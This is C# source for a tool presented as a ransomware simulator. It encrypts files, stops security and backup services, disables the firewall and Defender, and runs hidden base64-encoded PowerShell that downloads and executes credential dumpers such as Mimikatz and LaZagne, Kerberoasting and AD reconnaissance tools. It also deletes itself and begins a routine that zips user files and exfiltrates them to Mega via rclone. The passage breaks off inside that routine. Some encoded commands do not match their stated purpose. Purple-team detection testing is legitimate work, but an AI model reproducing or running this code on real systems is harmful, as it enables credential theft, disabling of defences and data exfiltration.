/*########################################################################################
# Title:        Ransim
# Author:       d4rk-d4nph3
# Description:  Ransomware Simulator
# Version:      0.2 (Beta)
# Released at:  2022/06/05
########################################################################################*/

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;

namespace Ransim
{
    class Program
    {
        public static bool IsAdministrator()
        {
            // Used to check if Ransim was ran as admin.
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                      .IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(data);
                }
            }
            return data;
        }

        static void FileEncrypt(string inputFile, string password)
        {

            //generate random salt
            byte[] salt = GenerateRandomSalt();

            //create output file name
            FileStream fsCrypt = new FileStream(inputFile + ".rsim", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            //Set Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;

            //http://stackoverflow.com/questions/2659214/why-do-i-need-to-use-the-rfc2898derivebytes-class-in-net-instead-of-directly
            //"What it does is repeatedly hash the user password along with the salt." High iteration counts.
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            //Cipher modes: http://security.stackexchange.com/questions/52665/which-is-the-best-cipher-mode-and-padding-mode-for-aes-encryption
            AES.Mode = CipherMode.CFB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }

        static void ManipulateRegistry()
        {
            /* Common registry changes performed by ransomware */

            // Enable Long Paths to avoid issues that may occur when encrypting files with long path names
            Process.Start("cmd.exe", @"/c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f");
            System.Threading.Thread.Sleep(500);
     
            // Revert the change
            Process.Start("cmd.exe", @"/c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 0 /f");

            // Disable UAC remote restrictions
            // See: 
            //       1. https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction
            //       2. https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167
            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
            System.Threading.Thread.Sleep(500);
            
            // Revert the change
            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f");

            // Disable EnableLinkedConnections to force the symbolic links to be written to both linked logon sessions
            // This is useful because when drive mappings are created, the system creates symbolic link objects (DosDevices) that associate the drive letters to the UNC paths 
            // These objects are specific for a logon session and are not shared between logon sessions
            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLinkedConnections / t REG_DWORD / d 1 / f");
            System.Threading.Thread.Sleep(500);

            // Revert the change
            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLinkedConnections / t REG_DWORD / d 0 / f");

        }

        static void StopServices()
        {
            // Some ransomware change the state of the services
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY$ECWDB2 start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLWriter start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config SstpSvc start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config MBAMService start=disabled");
            Process.Start(@"C:\Windows\System32\sc.exe", "config wuauserv start=disabled");

            // Stopping services so that there will be no file lock issue during encryption process
            // Only a handful of services are stopped
            Process.Start(@"C:\Windows\System32\net.exe", "stop KAVFS");
            Process.Start(@"C:\Windows\System32\net.exe", "stop klnagent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop TrueKey");
            Process.Start(@"C:\Windows\System32\net.exe", "stop TrueKeyScheduler");
            Process.Start(@"C:\Windows\System32\net.exe", "stop AcronisAgent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop SQLWriter");
            Process.Start(@"C:\Windows\System32\net.exe", "stop SQLBrowser");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MSExchangeES");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MSExchangeSRS");
            Process.Start(@"C:\Windows\System32\net.exe", "stop OracleClientCache80");
            Process.Start(@"C:\Windows\System32\net.exe", "stop ShMonitor");
            Process.Start(@"C:\Windows\System32\net.exe", "stop McAfeeEngineService");
            Process.Start(@"C:\Windows\System32\net.exe", "stop MBEndpointAgent");
            Process.Start(@"C:\Windows\System32\net.exe", "stop EhttpSrv");
        }
        
        static void RunPowerView()
        {
            // Fetch and run PowerView.ps1 for recon
            /* Runs Invoke-WebRequest -useb https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 | iex; Get-NetDomain; Get-NetDomainController; Get-NetGPO; Invoke-ShareFinder */
            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHMAZQBiACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8AUgBlAGMAbwBuAC8AUABvAHcAZQByAFYAaQBlAHcALgBwAHMAMQAgAHwAIABpAGUAeAA7ACAARwBlAHQALQBOAGUAdABEAG8AbQBhAGkAbgA7ACAARwBlAHQALQBOAGUAdABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByADsAIABHAGUAdAAtAE4AZQB0AEcAUABPADsAIABJAG4AdgBvAGsAZQAtAFMAaABhAHIAZQBGAGkAbgBkAGUAcgA=");

        }

        static void InvokeKerberoast()
        {
            // Fetch and run Invoke-Kerberoast.ps1
            /* Runs Invoke-WebRequest -useb https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 | iex; Invoke-Kerberoast | fl */
            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHMAZQBiACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBFAG0AcABpAHIAZQBQAHIAbwBqAGUAYwB0AC8ARQBtAHAAaQByAGUALwBtAGEAcwB0AGUAcgAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0AC4AcABzADEAIAB8ACAAaQBlAHgAOwAgAEkAbgB2AG8AawBlAC0ASwBlAHIAYgBlAHIAbwBhAHMAdAAgAHwAIABmAGwA");
        }

        static void InvokeGPPPassword()
        {
            // Fetch and run Invoke-GPPPassword.ps1
            // Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences
            /* Runs Invoke-WebRequest -useb https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 | iex; Get-GPPPassword */
            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHMAZQBiACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZAAuAHAAcwAxACAAfAAgAGkAZQB4ADsAIABHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZAA=");
        }

        static void RunLaZagne()
        {
            // Fetch and run LaZagne credential dumper
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe -Out $env:temp\laz.exe; Start-Process $env:temp\laz.exe -ArgumentList "memory" -NoNewWindow -Wait; del $env:temp\laz.exe -Force */
            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AQQBsAGUAcwBzAGEAbgBkAHIAbwBaAC8ATABhAFoAYQBnAG4AZQAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgA0AC4AMwAvAGwAYQB6AGEAZwBuAGUALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAGwAYQB6AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAGwAYQB6AC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBtAGUAbQBvAHIAeQAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcAIAAtAFcAYQBpAHQAOwAgAGQAZQBsACAAJABlAG4AdgA6AHQAZQBtAHAAXABsAGEAegAuAGUAeABlACAALQBGAG8AcgBjAGUADQAKAA==");
        }

        static void RunPsExec()
        {
            // Fetch and run PsExec
            /* $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://live.sysinternals.com/PsExec64.exe -Out $env:temp\psexec.exe; Start-Process $env:temp\psexec.exe -ArgumentList "-r SysUpdate ipconfig" -NoNewWindow -Wait; del $env:temp\psexec.exe */
            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBsAGkAdgBlAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAFAAcwBFAHgAZQBjADYANAAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcgAgAFMAeQBzAFUAcABkAGEAdABlACAAaQBwAGMAbwBuAGYAaQBnACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwAgAC0AVwBhAGkAdAA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAHAAcwBlAHgAZQBjAC4AZQB4AGUADQAKAA==");
        }

        static void RunMimikatz()
        {
            // Fetch and run Mimikatz
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/Mimikatz.exe -Out $env:temp\mimikatz.exe; Start-Process $env:temp\mimikatz.exe -ArgumentList '"privilege::debug" "sekurlsa::logonpasswords" "exit"' -NoNewWindow -Wait; del $env:temp\mimikatz.exe */
            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBNAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAG0AaQBtAGkAawBhAHQAegAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AHQAZQBtAHAAXABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnACIAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwAiACAAIgBzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBwAGEAcwBzAHcAbwByAGQAcwAiACAAIgBlAHgAaQB0ACIAJwAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3ACAALQBXAGEAaQB0ADsAIABkAGUAbAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUADQAKAA==");
        }

        static void RunADFind()
        {
            // Fetch and run ADFind batch file
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/AdFind.exe -Out $env:programdata\adfind.exe; Invoke-WebRequest -URI https://raw.githubusercontent.com/d4rk-d4nph3/Ransim/v0.2/Tools/adfind.bat -Out $env:programdata\adfind.bat; Start-Process C:\Windows\System32\cmd.exe -ArgumentList "/c $env:programdata\adfind.bat" -NoNewWindow -Wait; del $env:programdata\adfind.exe -Force; del $env:programdata\adfind.bat -Force */
            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBNAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAG0AaQBtAGkAawBhAHQAegAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AHQAZQBtAHAAXABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnACIAcAByAGkAdgBpAGwAZQBnAGUAOgA6AGQAZQBiAHUAZwAiACAAIgBzAGUAawB1AHIAbABzAGEAOgA6AGwAbwBnAG8AbgBwAGEAcwBzAHcAbwByAGQAcwAiACAAIgBlAHgAaQB0ACIAJwAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3ACAALQBXAGEAaQB0ADsAIABkAGUAbAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUADQAKAA==");
        }

        static void RunSeatbelt()
        {
            // Fetch and run Seatbelt from Flangvik's SharpCollection
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Seatbelt.exe -Out $env:temp\seatbelt.exe; Start-Process $env:temp\seatbelt.exe -ArgumentList "-group=system" -NoNewWindow -Wait; del $env:temp\seatbelt.exe */
            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBsAGkAdgBlAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAFAAcwBFAHgAZQBjADYANAAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcABzAGUAeABlAGMALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AcgAgAFMAeQBzAFUAcABkAGEAdABlACAAaQBwAGMAbwBuAGYAaQBnACIAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwAgAC0AVwBhAGkAdAA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAHAAcwBlAHgAZQBjAC4AZQB4AGUADQAKAA==");
        }

        static void DisableFirewall()
        {
            // Disable Defender Firewall
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
            System.Threading.Thread.Sleep(3000);
            // Enable it back
            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state on");
            System.Threading.Thread.Sleep(500);

        }

        static void DisableAV()
        {
            // Although AV is already disabled, this is to monitor for AV disabling attempts

            // Disable Defender's Real-Time Monitoring
            Process.Start("powershell.exe", "-command Set-MpPreference -DisableRealtimeMonitoring 1");

            // Disable Defender's Controlled Folder Access
            Process.Start("powershell.exe", "-command Set-MpPreference -EnableControlledFolderAccess Disabled");
        }

        static void SimulateCobaltStrike()
        {
            // Runs cobaltstrike simulator module from https://github.com/NextronSystems/APTSimulator
            // Uses cobalt strike's default named pipes naming scheme to simulate cobalt strike
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://raw.githubusercontent.com/d4rk-d4nph3/Ransim/v0.2/Tools/cobaltstrike-simulator.bat -Out $env:temp\cs-simulator.bat; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/CreateNamedPipe.exe -Out $env:temp\CreateNamedPipe.exe; Start-Process cmd.exe -ArgumentList "/c $env:temp\cs-simulator.bat" -NoNewWindow -Wait; del $env:temp\cs-simulator.bat -Force; del $env:temp\CreateNamedPipe.exe -Force */
            Process.Start("powershell.exe", "-nop -exec bypass -win hid -encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwB2ADAALgAyAC8AVABvAG8AbABzAC8AYwBvAGIAYQBsAHQAcwB0AHIAaQBrAGUALQBzAGkAbQB1AGwAYQB0AG8AcgAuAGIAYQB0ACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAYwBzAC0AcwBpAG0AdQBsAGEAdABvAHIALgBiAGEAdAA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBDAHIAZQBhAHQAZQBOAGEAbQBlAGQAUABpAHAAZQAuAGUAeABlACAALQBPAHUAdAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAQwByAGUAYQB0AGUATgBhAG0AZQBkAFAAaQBwAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAbQBkAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAvAGMAIAAkAGUAbgB2ADoAdABlAG0AcABcAGMAcwAtAHMAaQBtAHUAbABhAHQAbwByAC4AYgBhAHQAIgAgAC0ATgBvAE4AZQB3AFcAaQBuAGQAbwB3ACAALQBXAGEAaQB0ADsAIABkAGUAbAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAYwBzAC0AcwBpAG0AdQBsAGEAdABvAHIALgBiAGEAdAAgAC0ARgBvAHIAYwBlADsAIABkAGUAbAAgACQAZQBuAHYAOgB0AGUAbQBwAFwAQwByAGUAYQB0AGUATgBhAG0AZQBkAFAAaQBwAGUALgBlAHgAZQAgAC0ARgBvAHIAYwBlAA==");
        }
        static void RunRecon()
        {
            // Runs a barrage of reconnaissance commands
            Process.Start("systeminfo.exe");
            Process.Start("whoami.exe", "/all");
            Process.Start("ipconfig.exe", "/all");
            Process.Start("route.exe", "print");
            Process.Start("net.exe", "user");
            Process.Start("arp.exe", "-a");
            Process.Start("net.exe", "share");
            Process.Start("net.exe", "view /all");
            Process.Start("net.exe", "view /all /domain");
            Process.Start("net.exe", "localgroup");
            Process.Start("net.exe", "config workstation");
            Process.Start("netstat.exe", "-ano");

            // Query installed AV
            Process.Start("wmic.exe", @"/Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");

            // Query VMs on the system
            Process.Start("powershell.exe", "-command Get-VM");

            // AD Domain recon
            Process.Start("nltest.exe", "/domain_trusts");
            Process.Start("nltest.exe", "/domain_trusts /all_trusts");
            Process.Start("net.exe", "group 'Domain Admins' /domain");   
        }

        static void ExecuteSharpHound()
        {
            // Fetches and runs SharpHound (the official data collector for BloodHound)
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/SharpHound.exe -Out $env:temp\sharphound.exe; Start-Process $env:temp\sharphound.exe -ArgumentList "--collectionmethods DConly --outputdirectory $env:temp --zipfilename JSONResult.zip" -NoNewWindow -Wait; del $env:temp\sharphound.exe -Force; del $env:temp\*_JSONResult.zip */
            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZAA0AHIAawAtAGQANABuAHAAaAAzAC8AUgBhAG4AcwBpAG0ALwByAGEAdwAvAHYAMAAuADIALwBUAG8AbwBsAHMALwBTAGgAYQByAHAASABvAHUAbgBkAC4AZQB4AGUAIAAtAE8AdQB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAHMAaABhAHIAcABoAG8AdQBuAGQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0ALQBjAG8AbABsAGUAYwB0AGkAbwBuAG0AZQB0AGgAbwBkAHMAIABEAEMAbwBuAGwAeQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACQAZQBuAHYAOgB0AGUAbQBwACAALQAtAHoAaQBwAGYAaQBsAGUAbgBhAG0AZQAgAEoAUwBPAE4AUgBlAHMAdQBsAHQALgB6AGkAcAAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcAIAAtAFcAYQBpAHQAOwAgAGQAZQBsACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAGgAYQByAHAAaABvAHUAbgBkAC4AZQB4AGUAIAAtAEYAbwByAGMAZQA7ACAAZABlAGwAIAAkAGUAbgB2ADoAdABlAG0AcABcAEoAUwBPAE4AUgBlAHMAdQBsAHQALgB6AGkAcAA=");

        }

        static void RansomNoteDownload(string ransomNote)
        {
            WebClient client = new WebClient();
            const string pastebin_url = "https://pastebin.com/dl/AwQWBWkV";
            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
            client.Headers.Add("referer", "https://pastebin.com");
            client.DownloadFile(pastebin_url, ransomNote);
        }

        static void LocationCheck()
        {
            // Use ipinfo to obtain geolocation information
            string responseJSON = string.Empty;
            string url = @"https://ipinfo.io/json";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                responseJSON = reader.ReadToEnd();
            }

            Console.WriteLine(responseJSON);
        }

        static void SelfDelete()
        {
            // Delete itself
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Process.Start("cmd.exe", "/c ping 1.1.1.1 -n 5 > Nul & Del " + exePath + " /F /Q");
        }

        static void ExfilData()
        {
            // Uses Rclone to exfil data
            // Zips all the files in Reports directory to an archive and exfils it via Rclone to Mega
            /* Runs $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -URI https://github.com/d4rk-d4nph3/Ransim/raw/v0.2/Tools/rclone.exe -Out $env:temp\rclone.exe; Invoke-WebRequest -URI https://raw.githubusercontent.com/d4rk-d4nph3/Ransim/v0.2/Tools/rclone.conf -Out $env:temp\rclone.conf; Compress-Archive -Path $env:userprofile\Reports -DestinationPath $env:temp\Exfil.zip -CompressionLevel Optimal; Start-Process "$env:temp\rclone.exe" -ArgumentList "--config $env:temp\rclone.conf --progress copy $env:temp\Exfil.zip mega:" -NoNewWindow -Wait; del $env:temp\Exfil.zip -Force */
